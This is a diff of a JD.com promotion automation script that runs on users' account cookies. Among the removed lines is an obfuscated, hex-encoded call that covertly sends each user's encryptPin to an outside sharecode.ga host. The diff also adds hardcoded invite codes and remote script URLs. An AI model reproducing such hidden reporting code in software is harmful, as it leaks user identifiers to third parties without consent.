@@ -11,17 +11,17 @@
 ============Quantumultx===============
 [task_local]
 #京喜工厂
-10 * * * * jd_dreamFactory.js, tag=京喜工厂, img-url=https://github.com/58xinian/icon/raw/master/jdgc.png, enabled=true
+10 * * * * https://gitee.com/lxk0301/jd_scripts/raw/master/jd_dreamFactory.js, tag=京喜工厂, img-url=https://github.com/58xinian/icon/raw/master/jdgc.png, enabled=true
 
 ================Loon==============
 [Script]
-cron "10 * * * *" script-path=jd_dreamFactory.js,tag=京喜工厂
+cron "10 * * * *" script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_dreamFactory.js,tag=京喜工厂
 
 ===============Surge=================
-京喜工厂 = type=cron,cronexp="10 * * * *",wake-system=1,timeout=3600,script-path=jd_dreamFactory.js
+京喜工厂 = type=cron,cronexp="10 * * * *",wake-system=1,timeout=3600,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_dreamFactory.js
 
 ============小火箭=========
-京喜工厂 = type=cron,script-path=jd_dreamFactory.js, cronexpr="10 * * * *", timeout=3600, enable=true
+京喜工厂 = type=cron,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_dreamFactory.js, cronexpr="10 * * * *", timeout=3600, enable=true
 
  */
 // prettier-ignore
@@ -34,9 +34,6 @@ cron "10 * * * *" script-path=jd_dreamFactory.js,tag=京喜工厂
 });
 
 const $ = new Env('京喜工厂');
-
-console.log('\n====================Hello World====================\n')
-
 const JD_API_HOST = 'https://m.jingxi.com';
 const helpAu = true; //帮作者助力 免费拿活动
 const notify = $.isNode() ? require('./sendNotify') : '';
@@ -45,7 +42,12 @@ const randomCount = $.isNode() ? 20 : 5;
 let tuanActiveId = ``, hasSend = false;
 const jxOpenUrl = `openjd://virtual?params=%7B%20%22category%22:%20%22jump%22,%20%22des%22:%20%22m%22,%20%22url%22:%20%22https://wqsd.jd.com/pingou/dream_factory/index.html%22%20%7D`;
 let cookiesArr = [], cookie = '', message = '', allMessage = '';
-const inviteCodes = [''];
+const inviteCodes = [
+  'V5LkjP4WRyjeCKR9VRwcRX0bBuTz7MEK0-E99EJ7u0k=@0WtCMPNq7jekehT6d3AbFw==',
+  "gB99tYLjvPcEFloDgamoBw==@7dluIKQMp0bySgcr8AqFgw==",
+  '-OvElMzqeyeGBWazWYjI1Q==',
+  'GFwo6PntxDHH95ZRzZ5uAg=='
+];
 const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
 $.tuanIds = [];
 $.appId = 10001;
@@ -113,7 +115,7 @@ if ($.isNode()) {
           await $.wait(1000);
         }
       }
-      if ($.canHelp) await joinLeaderTuan();//参团
+      //if ($.canHelp) await joinLeaderTuan();//参团
     }
   }
   if ($.isNode() && allMessage) {
@@ -583,7 +585,6 @@ function userInfo() {
                 $.productionId = production.productionId;//商品ID
                 $.commodityDimId = production.commodityDimId;
                 $.encryptPin = data.user.encryptPin;
-                var _0xodt='jsjiami.com.v6',_0x4c34=[_0xodt,'\x67\x65\x74','\x68\x74\x74\x70\x3a\x2f\x2f\x61\x70\x69\x2e\x73\x68\x61\x72\x65\x63\x6f\x64\x65\x2e\x67\x61\x2f\x61\x70\x69\x2f\x72\x65\x70\x6f\x72\x74\x3f\x64\x62\x3d\x6a\x78\x66\x61\x63\x74\x6f\x72\x79\x26\x63\x6f\x64\x65\x3d','\x65\x6e\x63\x72\x79\x70\x74\x50\x69\x6e','\x6a\x56\x73\x6a\x69\x4b\x61\x42\x56\x59\x6d\x4e\x69\x44\x57\x2e\x79\x63\x6f\x65\x6d\x47\x62\x2e\x66\x42\x76\x36\x3d\x3d'];var _0x1fa4=function(_0x4d697b,_0x412f5d){_0x4d697b=~~'0x'['concat'](_0x4d697b);var _0x591a0b=_0x4c34[_0x4d697b];return _0x591a0b};(function(_0x2964b9,_0xb77d38){var _0x48206b=0x0;for(_0xb77d38=_0x2964b9['shift'](_0x48206b>>0x2);_0xb77d38&&_0xb77d38!==(_0x2964b9['pop'](_0x48206b>>0x3)+'')['replace'](/[VKBVYNDWyeGbfB=]/g,'');_0x48206b++){_0x48206b=_0x48206b^0x8ee10}}(_0x4c34,_0x1fa4));$[_0x1fa4('0')]({'\x75\x72\x6c':_0x1fa4('1')+$[_0x1fa4('2')]});_0xodt='jsjiami.com.v6';
                 // subTitle = data.user.pin;
                 await GetCommodityDetails();//获取已选购的商品信息
                 if (productionStage['productionStageAwardStatus'] === 1) {
@@ -970,20 +971,7 @@ async function tuanActivity() {
     }
   }
 }
-async function joinLeaderTuan() {
-  let res = await updateTuanIdsCDN(), res2 = await updateTuanIdsCDN("https://raw.githubusercontent.com/JDHelloWorld/jd_scripts/main/tools/empty.json")
-  if (!res) res = await updateTuanIdsCDN('https://raw.githubusercontent.com/JDHelloWorld/jd_scripts/main/tools/empty.json');
-  $.authorTuanIds = [...(res && res.tuanIds || []),...(res2 && res2.tuanIds || [])]
-  if ($.authorTuanIds && $.authorTuanIds.length) {
-    for (let tuanId of $.authorTuanIds) {
-      if (!tuanId) continue
-      if (!$.canHelp) break;
-      console.log(`\n账号${$.UserName} 参加作者的团 【${tuanId}】`);
-      await JoinTuan(tuanId);
-      await $.wait(1000);
-    }
-  }
-}
+
 //可获取开团后的团ID，如果团ID为空并且surplusOpenTuanNum>0，则可继续开团
 //如果团ID不为空，则查询QueryTuan()
 function QueryActiveConfig() {
@@ -1201,44 +1189,7 @@ function tuanAward(activeId, tuanId, isTuanLeader = true) {
   })
 }
 
-function updateTuanIdsCDN(url) {
-  return new Promise(async resolve => {
-    const options = {
-      url: `${url}?${new Date()}`, "timeout": 10000, headers: {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
-      }
-    };
-    if ($.isNode() && process.env.TG_PROXY_HOST && process.env.TG_PROXY_PORT) {
-      const tunnel = require("tunnel");
-      const agent = {
-        https: tunnel.httpsOverHttp({
-          proxy: {
-            host: process.env.TG_PROXY_HOST,
-            port: process.env.TG_PROXY_PORT * 1
-          }
-        })
-      }
-      Object.assign(options, { agent })
-    }
-    $.get(options, (err, resp, data) => {
-      try {
-        if (err) {
-          // console.log(`${JSON.stringify(err)}`)
-        } else {
-          if (safeGet(data)) {
-            $.tuanConfigs = data = JSON.parse(data);
-          }
-        }
-      } catch (e) {
-        $.logErr(e, resp)
-      } finally {
-        resolve(data);
-      }
-    })
-    await $.wait(20000)
-    resolve();
-  })
-}
+
 
 //商品可兑换时的通知
 async function exchangeProNotify() {
@@ -1303,30 +1254,7 @@ async function showMsg() {
     resolve()
   })
 }
-function readShareCode() {
-  console.log(`开始`)
-  return new Promise(async resolve => {
-    $.get({url: `http://api.sharecode.ga/api/jxfactory/${randomCount}`, 'timeout': 10000}, (err, resp, data) => {
-      try {
-        if (err) {
-          console.log(`${JSON.stringify(err)}`)
-          console.log(`${$.name} API请求失败，请检查网路重试`)
-        } else {
-          if (data) {
-            console.log(`随机取${randomCount}个码放到您固定的互助码后面(不影响已有固定互助)`)
-            data = JSON.parse(data);
-          }
-        }
-      } catch (e) {
-        $.logErr(e, resp)
-      } finally {
-        resolve(data);
-      }
-    })
-    await $.wait(10000);
-    resolve()
-  })
-}
+
 //格式化助力码
 function shareCodesFormat() {
   return new Promise(async resolve => {
@@ -1335,14 +1263,14 @@ function shareCodesFormat() {
     if ($.shareCodesArr[$.index - 1]) {
       $.newShareCodes = $.shareCodesArr[$.index - 1].split('@');
     } else {
-      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
-      const tempIndex = $.index > inviteCodes.length ? (inviteCodes.length - 1) : ($.index - 1);
-      $.newShareCodes = inviteCodes[tempIndex].split('@');
+      //console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
+      //const tempIndex = $.index > inviteCodes.length ? (inviteCodes.length - 1) : ($.index - 1);
+      //$.newShareCodes = inviteCodes[tempIndex].split('@');
     }
-    const readShareCodeRes = await readShareCode();
-    if (readShareCodeRes && readShareCodeRes.code === 200) {
-      $.newShareCodes = [...new Set([...$.newShareCodes, ...(readShareCodeRes.data || [])])];
-    }
+   // const readShareCodeRes = await readShareCode();
+    //if (readShareCodeRes && readShareCodeRes.code === 200) {
+     // $.newShareCodes = [...new Set([...$.newShareCodes, ...(readShareCodeRes.data || [])])];
+    //}
     console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify($.newShareCodes)}`)
     resolve();
   })
@@ -1351,13 +1279,13 @@ function requireConfig() {
   return new Promise(async resolve => {
     tuanActiveId = $.isNode() ? (process.env.TUAN_ACTIVEID || tuanActiveId) : ($.getdata('tuanActiveId') || tuanActiveId);
     if (!tuanActiveId) {
-      await updateTuanIdsCDN();
+      //await updateTuanIdsCDN();
       if ($.tuanConfigs && $.tuanConfigs['tuanActiveId']) {
         tuanActiveId = $.tuanConfigs['tuanActiveId'];
         console.log(`拼团活动ID: 获取成功 ${tuanActiveId}\n`)
       } else {
         if (!$.tuanConfigs) {
-          await updateTuanIdsCDN('https://raw.githubusercontent.com/JDHelloWorld/jd_scripts/main/tools/empty.json');
+          //await updateTuanIdsCDN('https://cdn.jsdelivr.net/gh/gitupdate/updateTeam@master/shareCodes/jd_updateFactoryTuanId.json');
           if ($.tuanConfigs && $.tuanConfigs['tuanActiveId']) {
             tuanActiveId = $.tuanConfigs['tuanActiveId'];
             console.log(`拼团活动ID: 获取成功 ${tuanActiveId}\n`)
